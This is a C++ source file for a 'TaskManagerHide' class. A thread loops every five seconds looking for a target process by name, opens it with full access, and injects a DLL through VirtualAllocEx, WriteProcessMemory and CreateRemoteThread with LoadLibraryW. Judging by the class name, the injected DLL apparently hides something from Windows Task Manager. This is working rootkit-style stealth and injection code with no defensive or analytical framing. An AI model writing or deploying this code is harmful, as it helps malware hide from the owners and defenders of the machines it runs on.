#include "TaskManager.h"

/*
the function run in loop findProcess
*/
DWORD WINAPI ProcessFindingLoop(LPVOID lpParam)
{
	TaskManagerHide* taskManager = (TaskManagerHide*)lpParam;
	while (1)
	{
		taskManager->findProcess(INJECT_INTO);
		Sleep(5000);
	}
}

void TaskManagerHide::findProcess(const char* name)
{
	HANDLE hProcess = NULL;
	int retValue = 0;
	// snapshot for all running processes
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	// initializing size - needed for using Process32First
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	// while first process in pEntry exists and process wasn't found yet
	while (hRes && hProcess == NULL)
	{
		// create const char for string comparison
		_bstr_t b(pEntry.szExeFile);
		if (strcmp(b, name) == 0)
		{
			// get handle
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)pEntry.th32ProcessID);
			if (hProcess)
			{
				injectProcess(hProcess);
			}
		}
		// go to next process
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

void TaskManagerHide::start()
{
	//create thread of findProcess
	DWORD threadId;
	this->_thread = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		ProcessFindingLoop,       // thread function name
		this,          // argument to thread function 
		0,                      // use default creation flags 
		&threadId);   // returns the thread identifier 	
}

void TaskManagerHide::injectProcess(HANDLE process)
{
	// Get full path of DLL to inject
	wchar_t dllPath[MAX_PATH] = { 0 };
	DWORD pathLen = GetFullPathNameW(DLL_NAME, MAX_PATH, dllPath, NULL);
	// Get LoadLibrary function address –
	// the address doesn't change at remote process
	PVOID addrLoadLibrary = (PVOID)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
	if (addrLoadLibrary == NULL)
	{
		return;
	}

	// Open remote process
	if (process == NULL)
	{
		return;
	}
	// Get a pointer to memory location in remote process,
	// big enough to store DLL path
	PVOID memAddr = (PVOID)VirtualAllocEx(process, NULL, pathLen * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == memAddr)
	{
		return;
	}
	// Write DLL name to remote process memory
	BOOL check = WriteProcessMemory(process, memAddr, dllPath, pathLen * sizeof(wchar_t), NULL);
	if (0 == check)
	{
		return;
	}
	// Open remote thread, while executing LoadLibrary
	// with parameter DLL name, will trigger DLLMain
	HANDLE hRemote = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addrLoadLibrary, memAddr, 0, NULL);
	if (NULL == hRemote)
	{
		return;
	}

	WaitForSingleObject(hRemote, INFINITE);
	CloseHandle(hRemote);
	CloseHandle(process);
}
